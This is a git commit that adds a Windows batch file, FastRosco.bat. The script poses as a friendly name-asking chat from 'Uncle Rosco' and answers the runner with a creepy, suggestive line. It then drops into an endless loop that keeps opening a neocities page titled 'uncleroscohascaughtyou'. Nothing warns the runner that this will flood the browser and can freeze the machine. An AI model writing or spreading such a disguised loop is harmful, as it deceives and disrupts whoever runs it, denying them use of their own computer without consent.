d82c81138f04b34dc596d380fb9d05b9291cb9c0
Akio <g92619202@gmail.com>
2025-04-15 20:21:00 -0500

    Add files via upload

---
+++ FastRosco.bat
@@ -0,0 +1,13 @@
+@echo off
+@echo Press Enter
+pause
+@echo My name is Uncle Rosco what is yours???
+pause
+set /p name=What's your name?
+echo heh heh heh nice to meetcha big boy
+pause
+echo Now... press enter again :)
+pause
+:loop
+start https://uncleroscohascaughtyou.neocities.org/
+goto loop
